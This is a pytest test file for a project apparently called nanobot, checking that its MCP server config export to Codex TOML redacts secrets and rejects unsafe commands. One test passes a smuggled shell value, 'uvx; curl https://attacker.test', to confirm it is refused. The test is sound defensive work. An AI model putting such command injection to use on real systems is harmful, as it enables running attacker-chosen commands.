from __future__ import annotations

import tomllib
from pathlib import Path

from typer.testing import CliRunner

from nanobot.cli import commands as cli_commands
from nanobot.cli.commands import app
from nanobot.config.schema import Config, MCPServerConfig
from nanobot.mcp_interop import codex_mcp_config, codex_toml_to_nanobot_mcp

runner = CliRunner()


def test_codex_export_preserves_transports_without_disclosing_credentials() -> None:
    """Exported Codex TOML must be usable while keeping configured secret values out of stdout."""
    secret = "mcp-export-secret-value"
    exported = codex_mcp_config({
        "local": MCPServerConfig(
            type="stdio",
            command="uvx",
            args=["example-mcp"],
            cwd="/workspace/project",
            env={"PUBLIC_MODE": "${RUNTIME_MODE}", "API_TOKEN": secret},
            enabled_tools=["lookup"],
        ),
        "remote": MCPServerConfig(
            type="streamableHttp",
            url="https://mcp.example.test/api",
            headers={"X-Request-Id": "request-42", "Authorization": f"Bearer {secret}"},
            enabled_tools=["search"],
        ),
    })

    parsed = tomllib.loads(exported.toml)["mcp_servers"]
    assert parsed["local"]["command"] == "uvx"
    assert parsed["local"]["args"] == ["example-mcp"]
    assert parsed["local"]["cwd"] == "/workspace/project"
    assert parsed["local"]["env_vars"] == ["API_TOKEN"]
    assert "env" not in parsed["local"]
    assert parsed["remote"]["url"] == "https://mcp.example.test/api"
    assert parsed["remote"]["http_headers"] == {"X-Request-Id": "request-42"}
    assert secret not in exported.toml
    assert any("inline environment value" in warning for warning in exported.warnings)
    assert (
        "Omitted unsupported environment reference '${RUNTIME_MODE}' for 'PUBLIC_MODE' on 'local'; "
        "Codex cannot rename inherited variables"
    ) in exported.warnings
    assert any("credential-like HTTP header" in warning for warning in exported.warnings)


def test_codex_export_inherits_same_named_environment_reference() -> None:
    """A same-name environment reference must use Codex inheritance, not a literal override."""
    exported = codex_mcp_config({
        "docs": MCPServerConfig(
            type="stdio",
            command="uvx",
            env={"API_TOKEN": "${API_TOKEN}"},
        ),
    })

    server = tomllib.loads(exported.toml)["mcp_servers"]["docs"]
    assert server["env_vars"] == ["API_TOKEN"]
    assert "env" not in server


def test_codex_export_rejects_shell_commands_instead_of_emitting_executable_toml() -> None:
    """A command with shell syntax must not survive the export boundary."""
    exported = codex_mcp_config({
        "unsafe": MCPServerConfig(type="stdio", command="uvx; curl https://attacker.test"),
    })

    assert exported.toml == ""
    assert exported.warnings == (
        "Skipped MCP server 'unsafe': command must be one executable, with arguments supplied separately",
    )


def test_codex_import_roundtrip_replaces_inline_environment_secrets_with_references() -> None:
    """Importing then re-exporting Codex config retains the server without retaining its secret."""
    secret = "codex-inline-secret-value"
    imported = codex_toml_to_nanobot_mcp(f'''\
[mcp_servers.docs]
command = "uvx"
args = ["docs-mcp"]
env_vars = ["API_TOKEN", "PUBLIC_MODE"]

[mcp_servers.docs.env]
API_TOKEN = "{secret}"
PUBLIC_MODE = "${{PUBLIC_MODE}}"
''')

    server = imported["mcpServers"]["docs"]
    assert server["env"] == {"API_TOKEN": "${API_TOKEN}", "PUBLIC_MODE": "${PUBLIC_MODE}"}

    exported = codex_mcp_config({"docs": MCPServerConfig.model_validate(server)})
    roundtripped = tomllib.loads(exported.toml)["mcp_servers"]["docs"]
    assert roundtripped["command"] == "uvx"
    assert roundtripped["args"] == ["docs-mcp"]
    assert roundtripped["env_vars"] == ["API_TOKEN", "PUBLIC_MODE"]
    assert "env" not in roundtripped
    assert secret not in exported.toml


def test_import_codex_cli_only_prints_sanitized_conversion(tmp_path: Path) -> None:
    """The import CLI reads a supplied Codex file but cannot overwrite it or disclose inline secrets."""
    secret = "cli-import-secret-value"
    source = tmp_path / "config.toml"
    original = f'''\
[mcp_servers.docs]
command = "uvx"
args = ["docs-mcp"]

[mcp_servers.docs.env]
API_TOKEN = "{secret}"
'''
    source.write_text(original, encoding="utf-8")
    result = runner.invoke(app, ["mcp", "import-codex", "--path", str(source), "--dry-run"])

    assert result.exit_code == 0
    assert source.read_text(encoding="utf-8") == original
    assert '"API_TOKEN": "${API_TOKEN}"' in result.stdout
    assert secret not in result.stdout



def test_codex_config_cli_prints_redacted_fragment_without_creating_codex_files(
    tmp_path: Path,
    monkeypatch,
) -> None:
    """The CLI export is output-only, uses the requested project CWD, and keeps secrets out of terminal output."""
    config_path = tmp_path / "nanobot.json"
    project = tmp_path / "project"
    secret = "cli-export-secret-value"
    loaded = Config()
    loaded.agents.defaults.workspace = str(tmp_path / "workspace")
    monkeypatch.setattr(cli_commands, "_load_config_for_cli", lambda *_args, **_kwargs: loaded)
    monkeypatch.setattr(
        "nanobot.agent.plugins.agent_plugin_mcp_servers",
        lambda *_args, **_kwargs: {
            "docs": MCPServerConfig(
                type="stdio",
                command="uvx",
                args=["docs-mcp"],
                env={"DOCS_TOKEN": secret},
            ),
        },
    )
    monkeypatch.setattr("nanobot.config.loader.set_config_path", lambda _path: None)

    result = runner.invoke(
        app,
        ["mcp", "codex-config", "--config", str(config_path), "--project", str(project)],
    )

    assert result.exit_code == 0
    parsed = tomllib.loads("\n".join(line for line in result.stdout.splitlines() if not line.startswith("#")))
    assert parsed["mcp_servers"]["docs"]["cwd"] == str(project.resolve())
    assert parsed["mcp_servers"]["docs"]["env_vars"] == ["DOCS_TOKEN"]
    assert secret not in result.output
    assert not config_path.exists()
    assert not (project / ".codex" / "config.toml").exists()
